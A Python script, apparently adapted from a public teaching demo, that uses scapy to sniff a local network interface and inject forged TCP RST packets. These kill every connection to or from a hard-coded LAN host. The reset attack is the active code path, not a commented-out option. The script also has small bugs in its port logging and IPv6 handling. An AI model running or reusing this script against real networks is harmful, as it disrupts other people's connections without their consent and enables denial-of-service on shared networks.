import ifaddr
import structlog
from scapy.layers.inet import IP, TCP
from scapy.layers.inet6 import IPv6
from scapy.sendrecv import send, sniff

# Refactor of https://github.com/robert/how-does-a-tcp-reset-attack-work/

log = structlog.get_logger()

DEFAULT_WINDOW_SIZE = 2052


def log_packet(packet):
    """This prints a big pile of debug information. We could make a prettier
    log function if we wanted."""
    if not packet.haslayer(IP):
        log.msg("", dst_ip=packet[IPv6].dst)
        log.msg("", dst_port=packet[TCP].dport)
        log.msg("", src_ip=packet[IPv6].src)
        log.msg("", src_port=packet[TCP].sport)

    else:
        log.msg("", dst_ip=packet[IP].dst)
        log.msg("", dst_port=packet[TCP].dport)
        log.msg("", src_ip=packet[IP].src)
        log.msg("", src_port=packet[TCP].dport)

    log.msg("Full packet", packet=packet)
    return packet.show()


def is_target_packet(server_ip, server_port):
    def f(packet):
        if not packet.haslayer(TCP):
            return False
        if not packet.haslayer(IP):
            dst_ip = packet[IPv6].dst
            src_ip = packet[IPv6].src
        else:
            dst_ip = packet[IP].dst
            src_ip = packet[IP].src

        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport

        return (dst_ip == server_ip) or (src_ip == server_ip)

    return f


def send_reset(iface, ignore_syn=True):
    def f(packet):
        if not packet.haslayer(TCP):
            return False
        if not packet.haslayer(IP):
            src_ip = packet[IPv6].src
            dst_ip = packet[IPv6].dst
        else:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport
        seq = packet[TCP].seq
        ack = packet[TCP].ack
        flags = packet[TCP].flags

        log.msg(
            "Grabbed packet",
            src_ip=src_ip,
            dst_ip=dst_ip,
            src_port=src_port,
            dst_port=dst_port,
            seq=seq,
            ack=ack
        )

        if "S" in flags and ignore_syn:
            log.msg("Packet has SYN flag, not sending RST")
            return

        rst_seq = ack
        p1 = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R",
                                              window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
        p2 = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="R",
                                              window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
        log.msg(
            "Sending RST packet...",
            orig_ack=ack,
            seq=rst_seq
        )

        send(p1, verbose=0, iface=iface)
        send(p2, verbose=0, iface=iface)

    return f


adapters = ifaddr.get_adapters()

for adapter in adapters:
    log.msg("IPs of network adapter:", adapter_name=adapter.nice_name)
    for ip in adapter.ips:
        log.msg("", ip=ip.ip, network_prefix=ip.network_prefix)


if __name__ == "__main__":
    target = "192.168.178.63"
    server_port = 1300

    log.msg("Starting sniff...")
    t = sniff(
        iface="wlp60s0",
        count=10000000,
        # NOTE: uncomment `send_reset` to run the reset attack instead of
        # simply logging the packet.
        prn=send_reset("wlp60s0"),
        # prn=log_packet,
        lfilter=is_target_packet(target, server_port)
    )
    log.msg("Finished sniffing!")
